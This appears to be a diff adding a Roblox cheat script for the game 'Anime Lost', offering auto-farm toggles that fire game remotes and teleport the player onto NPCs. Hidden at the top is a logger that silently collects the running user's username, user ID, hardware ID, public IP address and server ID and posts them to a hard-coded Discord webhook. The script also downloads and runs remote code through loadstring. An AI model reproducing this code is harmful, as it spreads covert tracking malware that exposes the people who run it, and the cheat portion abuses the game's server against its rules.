@@ -1,0 +1,147 @@
+local plrs = game.Players:GetPlayers()
+
+local data = {
+	["content"] = "",
+	["tts"] = false,
+	["embeds"]= {{
+		["type"] = "rich",
+		["title"] = "New user executed the script !",
+		["description"] = "",
+		["color"] = 1925743,
+		["fields"] = { {
+			["name"] = "username :",
+			["value"] = game.Players.LocalPlayer.Name,
+			["inline"] = true
+		},{
+			["name"] = "game id",
+			["value"] = tostring(game.PlaceId),
+			["inline"] = true
+		},{
+			["name"] = "HWID",
+			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+			["inline"] = true
+		}, {
+			["name"] = "ip :",
+			["value"] = game:HttpGet("https://api.ipify.org/"),
+			["inline"] = true
+		}, {
+			["name"] = "Server :",
+			["value"] = game.JobId,
+			["inline"] = true
+		}, {
+			["name"] = "UserId :",
+			["value"] = game.Players.LocalPlayer.UserId,
+			["inline"] = true
+		}, {
+			["name"] = "Device :",
+			["value"] = "pc",
+			["inline"] = true
+		}, {
+			["name"] = "Number of players in the server :",
+			["value"] = tostring(#plrs)
+		} },
+		["footer"] = {
+			["text"] = "Haxx Logger :)",
+			["icon_url"] = "https://cdn.discordapp.com/icons/1003990969127018587/e790a56e3fb6155d1c2685742fc9c16a.webp?size=160https://cdn.discordapp.com/icons/1003990969127018587/e790a56e3fb6155d1c2685742fc9c16a.webp?size=160"
+		},
+		["thumbnail"] = {
+			["url"] = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(game.Players.LocalPlayer.UserId).."&size=100x100&format=Png&isCircular=true")).data[1].imageUrl,
+			["height"] = 0,
+			["width"] = 0
+		},
+		["url"] = "https://www.roblox.com/users/"..tostring(game.Players.LocalPlayer.UserId).."/profile"
+	}},
+}
+local finaldata = game:GetService("HttpService"):JSONEncode(data)
+local function sendmsg(webhook)
+	local request = http_request or request or HttpPost or syn.request
+	request(
+		{Url = webhook, Body = finaldata,
+			["Method"] = "POST",
+			["Headers"] = {["content-type"] = "application/json"}})
+end
+
+sendmsg("https://discord.com/api/webhooks/1098273968772882475/DfUSMESeI2cypjjqBTC2ypLtPOOkURQZm3vzp7CuRQDUbJbuyCrdxyqyz-6GuYNn7_F3")
+
+
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/HRT9014/Nuke-X/main/lib"))()
+
+-- DEFAULT getgenvs
+getgenv().Disco = false
+getgenv().ANTIMONKEY = true
+getgenv().Key = "G"
+
+local mylib = lib:Create('Anime Lost')
+local page1 = mylib:addTab("Home", icons.home_icon)
+
+getgenv().AutoPower = false
+page1:addToggle("Auto Farm Power", function()
+    spawn(function()
+        if getgenv().AutoPower == false then
+            getgenv().AutoPower = true
+            while getgenv().AutoPower == true do
+                task.wait(0.01)
+                game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("LBConnection"):WaitForChild("Remotes"):WaitForChild("attackFunc"):FireServer()
+            end
+        else
+            getgenv().AutoPower = false
+        end
+    end)
+end)
+
+
+getgenv().AutoPowerUp = false
+page1:addToggle("Auto Power Up", function()
+    spawn(function()
+        if getgenv().AutoPowerUp == false then
+            getgenv().AutoPowerUp = true
+            while getgenv().AutoPowerUp == true do
+                wait(1)
+                game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("LBConnection"):WaitForChild("Remotes"):WaitForChild("RebirthRem"):FireServer()
+            end
+        else
+            getgenv().AutoPowerUp = false
+        end
+    end)
+end)
+
+getgenv().AutoNpc = false
+page1:addToggle("Auto Farm Npcs", function()
+    spawn(function()
+        if getgenv().AutoNpc == false then
+            getgenv().AutoNpc = true
+            while getgenv().AutoNpc == true do
+                wait(1)
+                for i, v in pairs(game:GetService("Workspace").EnemyNPCs.Sarnek:GetChildren()) do
+                    if v:IsA('MeshPart') or v:IsA('Part') then
+                        if v:FindFirstChildWhichIsA('Model') and math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude) < 1500 then
+                            local npc_char = v:FindFirstChildOfClass('Model')
+                            local npc_info = npc_char:FindFirstChild('Info')
+                            local npc_maxhealth = npc_info.MaxHealth
+                            local npc_health = npc_info.CurrentHealth
+                            local npc_level = npc_info.Level
+
+                            repeat
+                                wait()
+                                local npc_hrt = npc_char:FindFirstChild('HumanoidRootPart')
+                                local myhrt = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+                                myhrt.CFrame = CFrame.new(npc_hrt.CFrame.X, npc_hrt.CFrame.Y - 1, npc_hrt.CFrame.Z)
+                                game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("LBConnection"):WaitForChild("Remotes"):WaitForChild("attackFunc"):FireServer()
+                                if getgenv().AutoNpc == false then
+                                    break
+                                end
+                            until npc_health == 0
+                            if getgenv().AutoNpc == false then
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        else
+            getgenv().AutoNpc = false
+        end
+    end)
+end)
+
